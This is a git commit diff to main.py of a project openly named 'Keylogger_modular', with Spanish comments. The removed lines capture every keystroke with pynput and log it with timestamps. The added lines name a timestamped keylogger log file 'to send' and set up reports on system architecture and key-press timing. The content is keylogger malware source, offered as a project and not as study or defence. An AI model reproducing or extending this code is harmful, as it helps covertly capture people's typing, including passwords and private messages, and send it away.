3667f788da202cbb532cbe761906a1b014812c5b
JulioEscalon <59298247+JulioEscalon@users.noreply.github.com>
2020-08-01 04:35:08 -0500

    Update main.py

--- Keylogger_modular/main.py
+++ Keylogger_modular/main.py
@@ -1,30 +1,16 @@
-import pynput
-import datetime
+import report
 import timing
-#import arch        # para crear el reporte de arquitectura
-log = ""
-tiempos = timing.tiempos()
+from datetime import datetime
 
+#Definiendo nombre del Keylogger a enviar
+fecha = datetime.now()
+m = "keylogger_{}.txt".format(fecha.strftime("%Y-%m-%d_%H-%M"))
 
-
-#une los datos que van al txt report
-def append_to_log(string):
-    global log 
-    log = string
-    print(log , "     " , str(datetime.datetime.today()))
-
-#captura de teclas
-def keylogger(key):
-        try:
-            otrokey = str(key.char)
-        except AttributeError:
-            if key == key.space:
-                otrokey = " "
-            else:
-                otrokey= " " + str(key) + " " 
-        append_to_log(otrokey)
-
-
+#Definiendo reportes
+main=report.report(m)
+arqui=report.report("arch.txt")
+repo_timing=report.report("press.txt")
 
 #iniciando proceso
+tiempos = timing.tiempos()
 tiempos.start()
